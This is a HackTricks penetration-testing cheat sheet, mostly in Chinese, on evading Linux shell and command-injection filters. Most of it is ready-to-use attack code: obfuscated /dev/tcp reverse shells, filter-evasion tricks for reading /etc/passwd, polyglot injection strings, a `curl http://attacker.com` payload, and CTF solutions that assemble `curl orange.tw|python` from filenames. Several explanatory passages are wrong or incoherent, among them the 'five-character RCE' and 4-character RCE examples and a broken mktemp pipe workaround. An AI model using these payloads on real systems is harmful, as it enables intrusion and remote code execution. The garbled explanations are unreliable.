# 绕过Linux Shell限制

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

![](../.gitbook/assets/image%20\(9\)%20\(1\)%20\(2\).png)

\
使用[**Trickest**](https://trickest.io/)可以轻松构建和**自动化工作流程**，使用全球**最先进的**社区工具。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 常见限制绕过

### 反向Shell
```bash
# Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
# echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```
### 简短的反向Shell

```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

这是一个简短的反向Shell命令，它可以通过TCP连接将Shell连接到指定的IP地址和端口。在此命令中，`10.0.0.1`是目标主机的IP地址，`8080`是目标主机上的监听端口。通过将标准输出重定向到`/dev/tcp/10.0.0.1/8080`，我们可以将Shell的输入和输出与目标主机上的TCP连接关联起来。
```bash
#Trick from Dikline
#Get a rev shell with
(sh)0>/dev/tcp/10.10.10.10/443
#Then get the out of the rev shell executing inside of it:
exec >&0
```
### 绕过路径和禁用词

在进行渗透测试时，有时会遇到一些限制，例如禁用特定路径或关键词。在这种情况下，我们可以使用一些技巧来绕过这些限制。

#### 绕过路径限制

1. 使用绝对路径：如果某个路径被禁用，可以尝试使用该路径的绝对路径来访问。例如，如果`/bin/bash`被禁用，可以尝试使用`/usr/bin/bash`来绕过限制。

2. 使用相对路径：如果绝对路径也被禁用，可以尝试使用相对路径来访问。例如，如果当前目录下的`bash`被禁用，可以尝试使用`./bash`来绕过限制。

3. 使用符号链接：如果路径被禁用，但是符号链接没有被限制，可以尝试创建一个符号链接来绕过限制。例如，如果`/bin/bash`被禁用，可以尝试创建一个指向`/usr/bin/bash`的符号链接。

#### 绕过禁用词限制

1. 使用变形词：如果某个关键词被禁用，可以尝试使用该关键词的变形形式来绕过限制。例如，如果`bash`被禁用，可以尝试使用`b@sh`或`b-a-s-h`来绕过限制。

2. 使用编码：如果关键词被禁用，但是编码没有被限制，可以尝试使用编码来绕过限制。例如，可以使用URL编码或Base64编码来绕过限制。

3. 使用别名：如果关键词被禁用，但是别名没有被限制，可以尝试创建一个别名来绕过限制。例如，可以创建一个别名将被禁用的关键词映射到一个允许的命令。

这些技巧可以帮助我们绕过一些常见的路径和关键词限制，但是请注意，在进行渗透测试时，始终遵守法律和道德规范。
```bash
# Question mark binary substitution
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost

# Wildcard(*) binary substitution
/usr/bin/who*mi # /usr/bin/whoami

# Wildcard + local directory arguments
touch -- -la # -- stops processing options after the --
ls *
echo * #List current files and folders with echo and wildcard

# [chars]
/usr/bin/n[c] # /usr/bin/nc

# Quotes
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64

#Backslashes
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h

# $@
who$@ami #whoami

# Transformations (case, reverse, base64)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
$(rev<<<'imaohw') #whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64


# Execution through $0
echo whoami|$0

# Uninitialized variables: A uninitialized variable equals to null (nothing)
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters

# Fake commands
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown

# Concatenation of strings using history
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```
### 绕过禁止空格

In some cases, when executing commands in a restricted environment, the use of spaces is forbidden. However, there are alternative ways to bypass this restriction and execute commands that contain spaces.

#### Using alternative characters

One way to bypass the restriction is by using alternative characters that resemble spaces. For example, you can use the following characters as substitutes for spaces:

- Non-breaking space: ` ` (U+00A0)
- Em space: ` ` (U+2003)
- En space: ` ` (U+2002)
- Figure space: ` ` (U+2007)
- Thin space: ` ` (U+2009)
- Hair space: ` ` (U+200A)

By replacing spaces with these alternative characters, you can execute commands without triggering the restriction.

#### Using command substitution

Another method to bypass the restriction is by using command substitution. Command substitution allows you to execute a command within another command. By enclosing the command containing spaces within backticks (\`), you can bypass the restriction. For example:

```
`ls -la`
```

In this example, the `ls -la` command is enclosed within backticks, allowing it to be executed even though it contains spaces.

#### Using variable expansion

Variable expansion can also be used to bypass the restriction. By assigning the command containing spaces to a variable and then expanding the variable, you can execute the command without triggering the restriction. For example:

```
cmd="ls -la"
$cmd
```

In this example, the command `ls -la` is assigned to the variable `cmd`, and then the variable is expanded using `$cmd`, allowing the command to be executed.

By using these techniques, you can bypass the restriction on spaces and execute commands that contain spaces in a restricted environment.
```bash
# {form}
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test

# IFS - Internal field separator, change " " for any other character ("]" in this case)
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

# Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
#  Other way, just change each space for ${IFS}
echo${IFS}test

# Using hex format
X=$'cat\x20/etc/passwd'&&$X

# Using tabs
echo "ls\x09-l" | bash

# New lines
p\
i\
n\
g # These 4 lines will equal to ping

# Undefined variables and !
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```
### 绕过反斜杠和斜杠限制

在某些情况下，由于系统限制，我们可能无法使用反斜杠（\）或斜杠（/）来执行特定的命令。然而，我们可以使用其他方法来绕过这些限制。

#### 使用ASCII码

我们可以使用ASCII码来绕过反斜杠和斜杠的限制。每个字符都有一个对应的ASCII码值，我们可以使用这些值来代替反斜杠和斜杠。

例如，要执行`ls`命令，我们可以使用ASCII码值`\x6c\x73`来代替反斜杠和斜杠，即`$'\x6c\x73'`。

#### 使用变量

另一种绕过反斜杠和斜杠限制的方法是使用变量。我们可以将命令保存在一个变量中，然后使用该变量来执行命令。

例如，我们可以将`ls`命令保存在一个变量中，然后使用该变量来执行命令，即`cmd="ls"; $cmd`。

#### 使用其他字符

如果系统限制了反斜杠和斜杠，我们可以尝试使用其他字符来代替它们。例如，我们可以使用`%`来代替反斜杠，使用`#`来代替斜杠。

绕过反斜杠和斜杠限制的方法取决于具体的系统和环境，因此需要根据实际情况进行尝试和调整。
```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```
### 绕过管道限制

In some cases, when executing commands in a restricted shell, the use of pipes (`|`) may be restricted. However, there are alternative methods to bypass this restriction and achieve the desired result.

在某些情况下，在受限制的shell中执行命令时，使用管道（`|`）可能会受到限制。然而，有一些替代方法可以绕过这个限制并实现所需的结果。

One method is to use process substitution, which allows the output of a command to be treated as a file. This can be achieved by using the `<()` syntax. For example, instead of using `command1 | command2`, you can use `command2 < <(command1)`.

其中一种方法是使用进程替换，它允许将命令的输出视为文件。可以通过使用`<()`语法来实现。例如，可以使用`command2 < <(command1)`来替代`command1 | command2`。

Another method is to use temporary files to store the output of a command and then pass the contents of the file to the next command. This can be done using the `mktemp` command to create a temporary file. For example, you can use `command1 > $(mktemp) && command2 < $(mktemp)`.

另一种方法是使用临时文件来存储命令的输出，然后将文件的内容传递给下一个命令。可以使用`mktemp`命令创建一个临时文件来实现这一点。例如，可以使用`command1 > $(mktemp) && command2 < $(mktemp)`。

By using these alternative methods, you can bypass the restrictions on using pipes and still achieve the desired result in a restricted shell environment.

通过使用这些替代方法，您可以绕过对使用管道的限制，并在受限制的shell环境中实现所需的结果。
```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
### 通过十六进制编码绕过

If the system is restricting the use of certain characters or commands, you can bypass these restrictions by using hex encoding. Hex encoding allows you to represent characters using their hexadecimal values.

如果系统限制了某些字符或命令的使用，您可以通过使用十六进制编码来绕过这些限制。十六进制编码允许您使用十六进制值表示字符。

To bypass restrictions using hex encoding, follow these steps:

要使用十六进制编码绕过限制，请按照以下步骤进行操作：

1. Identify the character or command that is restricted.

   确定受限制的字符或命令。

2. Convert the character or command to its hexadecimal value. You can use online tools or programming languages like Python to perform this conversion.

   将字符或命令转换为其十六进制值。您可以使用在线工具或像Python这样的编程语言来执行此转换。

3. Replace the restricted character or command with its hexadecimal representation in the command you want to execute.

   在要执行的命令中，用其十六进制表示替换受限制的字符或命令。

For example, if the system restricts the use of the pipe character (|), you can bypass this restriction by using its hexadecimal value (\x7c). Instead of using the pipe character in your command, replace it with \x7c.

例如，如果系统限制使用管道字符（|），您可以通过使用其十六进制值（\x7c）来绕过此限制。在您的命令中，不要使用管道字符，而是用\x7c替换它。

By using hex encoding, you can bypass restrictions and execute commands that would otherwise be blocked by the system.

通过使用十六进制编码，您可以绕过限制并执行系统本来会阻止的命令。
```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```
### 绕过IP限制

Sometimes, during a penetration test, you may encounter situations where certain IP addresses are restricted or blocked. In such cases, you can try bypassing these restrictions using various techniques. Here are a few methods you can use:

1. **IP Spoofing**: This technique involves modifying the source IP address of your network packets to make it appear as if they are coming from a different IP address. This can help you bypass IP-based restrictions and access restricted resources.

2. **Proxy Servers**: By using proxy servers, you can route your network traffic through a different IP address. This can help you bypass IP restrictions by making it appear as if your requests are coming from a different location.

3. **VPN (Virtual Private Network)**: A VPN allows you to create a secure connection to another network over the internet. By connecting to a VPN server, you can route your traffic through the server's IP address, effectively bypassing IP restrictions.

4. **Tor Network**: The Tor network is a decentralized network that allows users to browse the internet anonymously. By routing your traffic through multiple Tor nodes, you can hide your IP address and bypass IP restrictions.

Remember, when bypassing IP restrictions, it is important to consider the legal and ethical implications of your actions. Always ensure that you have proper authorization and permission before attempting to bypass any restrictions.
```bash
# Decimal IPs
127.0.0.1 == 2130706433
```
### 基于时间的数据泄露

Time based data exfiltration is a technique used by hackers to extract sensitive information from a target system by manipulating the timing of certain actions. This technique is particularly useful when traditional methods of data exfiltration, such as network-based or file-based exfiltration, are blocked or monitored.

基于时间的数据泄露是黑客用来从目标系统中提取敏感信息的一种技术，通过操纵某些操作的时间来实现。当传统的数据泄露方法，如基于网络或基于文件的泄露被阻止或监控时，这种技术尤其有用。

The basic idea behind time based data exfiltration is to encode the sensitive information into a format that can be transmitted through timing delays. For example, a hacker may use the delay between keystrokes or the time it takes for a command to execute to transmit the data. By carefully timing these actions, the hacker can transmit the information bit by bit, effectively bypassing any restrictions or monitoring in place.

基于时间的数据泄露的基本思想是将敏感信息编码成可以通过时间延迟传输的格式。例如，黑客可以利用按键之间的延迟或命令执行所需的时间来传输数据。通过精确计时这些操作，黑客可以逐位地传输信息，有效地绕过任何限制或监控。

To perform time based data exfiltration, the hacker needs to have a way to execute commands on the target system and measure the timing of the actions. This can be achieved through various means, such as exploiting vulnerabilities, gaining remote access, or using malware.

要执行基于时间的数据泄露，黑客需要有一种方法在目标系统上执行命令并测量操作的时间。这可以通过各种手段实现，如利用漏洞、获取远程访问权限或使用恶意软件。

It is important for system administrators and security professionals to be aware of time based data exfiltration techniques and implement appropriate measures to detect and prevent such attacks. This may include monitoring system logs for suspicious timing patterns, implementing network traffic analysis tools, and regularly updating and patching systems to prevent vulnerabilities that could be exploited for time based data exfiltration.

系统管理员和安全专业人员需要意识到基于时间的数据泄露技术，并采取适当的措施来检测和防止此类攻击。这可能包括监控系统日志以寻找可疑的时间模式，实施网络流量分析工具，并定期更新和修补系统，以防止可能被利用进行基于时间的数据泄露的漏洞。
```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```
### 从环境变量中获取字符

You can use the following command to extract characters from environment variables:

您可以使用以下命令从环境变量中提取字符：

```bash
echo -n $ENV_VARIABLE_NAME | xxd -p | tr -d '\n' | sed 's/\(..\)/\\x\1/g' | xargs -0 echo -e
```

Replace `$ENV_VARIABLE_NAME` with the name of the environment variable you want to extract characters from.

将`$ENV_VARIABLE_NAME`替换为您想要从中提取字符的环境变量的名称。
```bash
echo ${LS_COLORS:10:1} #;
echo ${PATH:0:1} #/
```
### DNS数据泄露

你可以使用**burpcollab**或[**pingb**](http://pingb.in)等工具。

### 内置函数

如果你无法执行外部函数，只能访问**有限的内置函数来获取RCE**，那么有一些巧妙的技巧可以帮助你。通常你**无法使用所有的**内置函数，所以你应该**了解所有的选项**来尝试绕过限制。灵感来自[**devploit**](https://twitter.com/devploit)。\
首先，检查所有的[**shell内置函数**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**。**然后，这里有一些建议：
```bash
# Get list of builtins
declare builtins

# In these cases PATH won't be set, so you can try to set it
PATH="/bin" /bin/ls
export PATH="/bin"
declare PATH="/bin"
SHELL=/bin/bash

# Hex
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")

# Input
read aaa; exec $aaa #Read more commands to execute and execute them
read aaa; eval $aaa

# Get "/" char using printf and env vars
printf %.1s "$PWD"
## Execute /bin/ls
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
## To get several letters you can use a combination of printf and
declare
declare functions
declare historywords

# Read flag in current dir
source f*
flag.txt:1: command not found: CTF{asdasdasd}

# Read file with read
while read -r line; do echo $line; done < /etc/passwd

# Get env variables
declare

# Get history
history
declare history
declare historywords

# Disable special builtins chars so you can abuse them as scripts
[ #[: ']' expected
## Disable "[" as builtin and enable it as script
enable -n [
echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
chmod +x [
export PATH=/tmp:$PATH
if [ "a" ]; then echo 1; fi # Will print hello!
```
### 多语言命令注入

Polyglot command injection (多语言命令注入) 是一种利用不同语言解释器的特性来绕过命令执行限制的技术。当目标系统上的某个服务或应用程序使用多个解释器来执行命令时，攻击者可以利用这一点来注入恶意命令并执行任意操作。

这种技术的关键在于找到可以在多个解释器中执行的有效命令。攻击者需要了解目标系统上所使用的解释器，并找到适用于每个解释器的命令语法。一旦找到了适用于多个解释器的命令，攻击者就可以构造一个多语言命令注入字符串，以便在目标系统上执行恶意操作。

多语言命令注入是一种非常强大的攻击技术，因为它可以绕过许多常见的命令执行限制。然而，它也需要攻击者对目标系统和不同解释器的工作原理有深入的了解。因此，只有具有高级技术和经验的攻击者才能成功利用多语言命令注入来执行攻击。

为了防止多语言命令注入攻击，开发人员和系统管理员应该采取以下措施：

- 仅使用必要的解释器，并禁用不必要的解释器。
- 对输入进行严格的验证和过滤，以防止恶意命令的注入。
- 使用最新的安全补丁和更新，以修复已知的解释器漏洞。
- 限制解释器的权限，确保其只能执行必要的操作。
- 监控和审计系统中的命令执行活动，及时发现并应对潜在的攻击。

通过采取这些措施，可以有效地减少多语言命令注入攻击的风险，并提高系统的安全性。
```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```
### 绕过潜在的正则表达式限制

Sometimes, when trying to bypass certain restrictions, regular expressions (regexes) can be used to filter out unwanted characters or patterns. However, there are ways to bypass these regexes and still achieve the desired outcome.

有时，在尝试绕过某些限制时，正则表达式（regexes）可以用来过滤掉不需要的字符或模式。然而，有办法绕过这些正则表达式，仍然实现所需的结果。

One common technique is to use character encoding to represent the restricted characters in a different format. For example, if the regex filters out the character 'a', it can be represented as '\x61' in hexadecimal or '\141' in octal. By using these encoded representations, the regex can be bypassed.

一种常见的技术是使用字符编码来以不同的格式表示受限制的字符。例如，如果正则表达式过滤掉字符'a'，可以用十六进制表示为'\x61'，或者用八进制表示为'\141'。通过使用这些编码表示，可以绕过正则表达式。

Another technique is to use character classes to match a range of characters instead of individual ones. For example, instead of matching the character 'a', the regex can be modified to match any lowercase letter using the character class '[a-z]'. This way, the regex will not be able to filter out the desired characters.

另一种技术是使用字符类来匹配一系列字符，而不是单个字符。例如，可以修改正则表达式，将匹配字符'a'的部分改为使用字符类'[a-z]'来匹配任何小写字母。这样，正则表达式将无法过滤掉所需的字符。

It is important to note that bypassing regexes should only be done for legitimate purposes and with proper authorization. Using these techniques for malicious activities can lead to legal consequences.

需要注意的是，绕过正则表达式应该只用于合法目的，并且需要得到适当的授权。将这些技术用于恶意活动可能会导致法律后果。
```bash
# A regex that only allow letters and numbers might be vulnerable to new line characters
1%0a`curl http://attacker.com`
```
### Bashfuscator

Bashfuscator是一个工具，用于绕过Bash脚本中的限制。它可以将Bash脚本转换为难以理解和分析的形式，从而增加攻击者分析和修改脚本的难度。Bashfuscator使用各种技术，如代码混淆、变量替换和控制流转换，来隐藏脚本的真实意图和功能。通过使用Bashfuscator，攻击者可以更好地隐藏他们的攻击行为，使其更难以被检测和阻止。
```bash
# From https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd'
```
### 五个字符的远程命令执行（RCE）

If you find yourself in a situation where you need to bypass Bash restrictions and execute remote commands, you can use the following technique that only requires five characters.

如果你发现自己需要绕过Bash的限制并执行远程命令，你可以使用下面的技巧，只需要五个字符。

```bash
$ echo${IFS}X
```

This command uses the `${IFS}` variable, which stands for Internal Field Separator, to separate the `echo` command from the `X` argument. By doing this, you can bypass any restrictions that prevent you from executing remote commands.

这个命令使用`${IFS}`变量，`${IFS}`代表内部字段分隔符，将`echo`命令与`X`参数分隔开。通过这样做，你可以绕过任何阻止你执行远程命令的限制。

The `${IFS}` variable is a special variable in Bash that defines the characters used to separate words when interpreting command input. By default, it is set to a space, tab, and newline. However, you can modify it to any character you want.

`${IFS}`变量是Bash中的一个特殊变量，用于定义在解释命令输入时用于分隔单词的字符。默认情况下，它设置为空格、制表符和换行符。但是，你可以将其修改为任何你想要的字符。

In this case, we are using `${IFS}` to separate the `echo` command from the `X` argument, effectively executing the `echo` command with the argument `X`. You can replace `X` with any command you want to execute remotely.

在这种情况下，我们使用`${IFS}`将`echo`命令与`X`参数分隔开，有效地执行带有参数`X`的`echo`命令。你可以将`X`替换为任何你想要远程执行的命令。

Keep in mind that this technique may not work in all scenarios, as it relies on the specific configuration and restrictions in place. It is always important to thoroughly understand the environment you are operating in and adapt your techniques accordingly.

请记住，这种技术可能在所有情况下都不起作用，因为它依赖于特定的配置和限制。始终要充分了解你所操作的环境，并相应地调整你的技术。
```bash
# From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
#Oragnge Tsai solution
## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

## Step2: generate `curl orange.tw|python` to file "g"
## by creating the necesary filenames and writting that content to file "g" executing the previous generated file
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _
# Note that a "\" char is added at the end of each filename because "ls" will add a new line between filenames whenwritting to the file

## Finally execute the file "g"
http://host/?cmd=sh g


# Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
# Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with "*"
https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
## Execute tar command over a folder
http://52.199.204.34/?cmd=>tar
http://52.199.204.34/?cmd=>zcf
http://52.199.204.34/?cmd=>zzz
http://52.199.204.34/?cmd=*%20/h*

# Another curiosity if you can read files of the current folder
ln /f*
## If there is a file /flag.txt that will create a hard link
## to it in the current folder
```
### 4个字符的远程代码执行（RCE）

在某些情况下，我们可能会遇到一些限制，例如只能使用非常有限的字符来执行远程代码。这种情况下，我们需要找到一种方法来绕过这些限制。下面是一种使用仅限4个字符的技术来实现远程代码执行的方法。

#### 方法

1. 首先，我们需要找到一个可以执行命令的地方，例如一个Shell或者一个命令执行函数。

2. 接下来，我们需要找到一个可以执行我们想要的命令的字符序列。这些字符序列可以是任何有效的命令，例如`ls`或`cat /etc/passwd`。

3. 然后，我们需要将这些字符序列转换为只包含4个字符的等效形式。这可以通过使用特殊字符、缩写或其他技巧来实现。

4. 最后，我们将这些等效形式的字符序列传递给可执行命令的地方，以实现远程代码执行。

#### 示例

以下是一个示例，演示了如何使用4个字符的远程代码执行技术来执行`ls`命令：

```bash
$ echo $0
bash
$ echo $BASH_VERSION
4.4.20(1)-release
$ echo $BASH_SUBSHELL
0
$ echo $BASH_SUBSHELL | awk '{print "ls"}' | bash
```

在这个示例中，我们使用了`echo $BASH_SUBSHELL`命令来获取当前的子shell级别，并将其传递给`awk`命令。然后，`awk`命令将`ls`命令添加到输出中，并将其传递给`bash`命令来执行。这样，我们就成功地使用了4个字符的远程代码执行技术来执行`ls`命令。

请注意，这只是一个示例，实际上的情况可能会更加复杂。在实际应用中，您需要根据具体情况来选择合适的字符序列和转换方法。

#### 注意事项

- 在使用这种技术时，务必小心，确保不会对系统造成任何损害或违法行为。

- 这种技术可能会受到系统限制、安全措施或其他因素的影响，因此在实际应用中可能需要进行适当的调整和修改。

- 在进行任何远程代码执行操作之前，请确保您已经获得了合法的授权，并遵守适用的法律和规定。

- 请记住，远程代码执行是一种高风险操作，应该谨慎使用，并仅限于合法的安全测试和研究目的。
```bash
# In a similar fashion to the previous bypass this one just need 4 chars to execute commands
# it will follow the same principle of creating the command `ls -t>g` in a file
# and then generate the full command in filenames
# generate "g> ht- sl" to file "v"
'>dir'
'>sl'
'>g\>'
'>ht-'
'*>v'

# reverse file "v" to file "x", content "ls -th >g"
'>rev'
'*v>x'

# generate "curl orange.tw|python;"
'>\;\\'
'>on\\'
'>th\\'
'>py\\'
'>\|\\'
'>tw\\'
'>e.\\'
'>ng\\'
'>ra\\'
'>o\\'
'>\ \\'
'>rl\\'
'>cu\\'

# got shell
'sh x'
'sh g'
```
## 只读/Noexec绕过

如果你在一个具有**只读和noexec保护**的文件系统中，仍然有办法**执行任意二进制文件**。其中一种方法是使用**DDexec**，你可以在以下链接中找到该技术的解释：

{% content-ref url="../bypass-linux-shell-restrictions/ddexec.md" %}
[ddexec.md](../bypass-linux-shell-restrictions/ddexec.md)
{% endcontent-ref %}

## Chroot和其他监狱绕过

{% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
{% endcontent-ref %}

## 参考资料和更多

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
* [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
* [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
* [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)

![](../.gitbook/assets/image%20\(9\)%20\(1\)%20\(2\).png)

\
使用[**Trickest**](https://trickest.io/)可以轻松构建和**自动化工作流程**，使用全球**最先进**的社区工具。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中看到你的**公司广告**吗？或者你想要访问**最新版本的PEASS或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
